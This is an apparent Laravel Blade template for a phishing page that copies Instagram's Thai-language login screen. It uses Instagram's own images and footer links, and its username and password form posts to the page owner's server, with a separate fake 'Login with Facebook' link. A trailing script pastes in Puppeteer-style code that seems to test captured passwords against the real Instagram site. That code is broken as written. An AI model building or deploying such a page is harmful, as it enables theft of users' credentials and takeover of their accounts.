<!DOCTYPE html>
<html lang="th">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link rel="stylesheet" href="{{asset('css/style.css')}}" />
  <link rel="icon" type="image/png" href="{{ asset('instagram.png') }}">
</head>

<body>
  <main class="main">
    <section class="section-left">
      <div class="phone-container">
        <div class="phones">
          <img id="phone-screen-old" class="phone-screen" src="https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot1-2x.png">
          <img id="phone-screen-new" class="phone-screen hidden" src="">
        </div>
      </div>
    </section>

    <section class="section-right">
      <div class="login-container @if(session('message')) login-failed @endif">
        <i
          data-visualcompletion="css-img"
          aria-label="Instagram"
          class="logo-container"
          role="img"
          style="
              background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yb/r/zsQl-NfXSne.png');
              width: 175px;
              height: 51px;
              display: inline-block;
            "></i>

        <form class="login-form" method="POST" action="{{ route('login') }}">
          @csrf
          <div class="form-group">
            <input
              type="text"
              placeholder="หมายเลขโทรศัพท์ ชื่อผู้ใช้ หรืออีเมล"
              name="username"
              id="username" />
          </div>
          <div class="form-group">
            <input
              type="password"
              placeholder="รหัสผ่าน"
              name="password"
              id="password" />
          </div>
          <button type="submit" class="login-button" id="login-button" disabled>เข้าสู่ระบบ</button>

          <div class="separator">
            <div class="line"></div>
            <div class="or">หรือ</div>
            <div class="line"></div>
          </div>

          <button type="button" class="facebook-login">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="#0095f6">
              <path
                d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z" />
            </svg>
            <span onclick="window.location.href='/f'">เข้าสู่ระบบด้วย Facebook</span>
          </button>
          <!-- <div class="error-message" style="color: red;">
              ขออภัย รหัสผ่านของคุณไม่ถูกต้อง โปรดตรวจสอบรหัสผ่านของคุณอีกครั้ง
          </div> -->
          @if(session('message'))
          <div class="error-message" style="color: red;">
            {{ session('message') }}
          </div>
          @endif


          <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password @if(session('message')) login-failed @endif">ลืมรหัสผ่านใช่ไหม</a>
        </form>

      </div>

      <div class="signup-container">
        <p>หากยังไม่มีบัญชี <a href="#">สมัครใช้งาน</a></p>
      </div>

      <div class="app-download">
        <p>ติดตั้งแอพ</p>
        <div class="store-buttons">
          <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D4C2C51EB-B379-4F86-874C-99D14EA2F84D%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge" class="store-button">
            <img
              src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
              alt="Get it on Google Play"
              class="google-play" />
          </a>
          <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=597%2C99%2C1144%2C845" class="store-button">
            <img
              src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
              alt="Get it from Microsoft"
              class="microsoft-store" />
          </a>
        </div>
      </div>
    </section>
  </main>

  <footer class="footer">
    <nav class="footer-nav">
      <ul>
        <li><a href="https://about.meta.com/">Meta</a></li>
        <li><a href="https://about.instagram.com/">เกี่ยวกับ</a></li>
        <li><a href="https://about.instagram.com/blog/">บล็อก</a></li>
        <li><a href="https://about.instagram.com/about-us/careers">งาน</a></li>
        <li><a href="https://help.instagram.com/">ความช่วยเหลือ</a></li>
        <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
        <li><a href="https://www.instagram.com/legal/privacy/">ความเป็นส่วนตัว</a></li>
        <li><a href="https://www.instagram.com/legal/terms/">ข้อกำหนด</a></li>
        <li><a href="https://www.instagram.com/explore/locations/">ตำแหน่ง</a></li>
        <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
        <li><a href="https://www.threads.net/">Threads</a></li>
        <li><a href="https://www.facebook.com/help/instagram/261704639352628">การอัพโหลดผู้ติดต่อและผู้ที่ไม่ได้ใช้บริการ</a></li>
        <li><a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">Meta Verified</a></li>
      </ul>
      <div class="language-copyright">
        <select class="language-selector">
          <option value="th">ภาษาไทย</option>
        </select>
        <span class="copyright">© 2025 Instagram from Meta</span>
      </div>
    </nav>
  </footer>
</body>

</html>

<script>
  document.addEventListener("DOMContentLoaded", function() {
    const oldScreen = document.getElementById("phone-screen-old");
    const newScreen = document.getElementById("phone-screen-new");
    const images = [
      "https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot1-2x.png",
      "https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot2-2x.png",
      "https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot3-2x.png",
      "https://static.cdninstagram.com/images/instagram/xig/homepage/screenshots/screenshot4-2x.png"
    ];

    let currentIndex = 0;

    function changeScreenImage() {
      currentIndex = (currentIndex + 1) % images.length;
      newScreen.src = images[currentIndex];
      newScreen.classList.remove("hidden");

      setTimeout(() => {
        oldScreen.src = newScreen.src;
        newScreen.classList.add("hidden");
      }, 1000);
    }

    setInterval(changeScreenImage, 4000);

  });

  const username = document.getElementById('username');
  const password = document.getElementById('password');
  const loginButton = document.getElementById('login-button');

  function toggleLoginButton() {
    if (username.value && password.value) {
      loginButton.classList.add('enabled');
      loginButton.disabled = false;
    } else {
      loginButton.classList.remove('enabled');
      loginButton.disabled = true;
    }
  }

  username.addEventListener('input', toggleLoginButton);
  password.addEventListener('input', toggleLoginButton);
</script>
<script>
  try {
    await page.waitForFunction(
        () => document.querySelector("div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid") !== null,
        { timeout: 5000 }
    );
    console.log("Login failed: Incorrect password");
    process.exit(1);
} catch (error) {
    console.log("Login successful");
    process.exit(0); 
}

if (document.querySelector('#error-message')) {
    const errorMessage = "ขออภัย รหัสผ่านของคุณไม่ถูกต้อง โปรดตรวจสอบรหัสผ่านของคุณอีกครั้ง";
    document.querySelector('#error-message').innerText = errorMessage;
    document.querySelector('#error-message').style.display = 'block';
}
</script>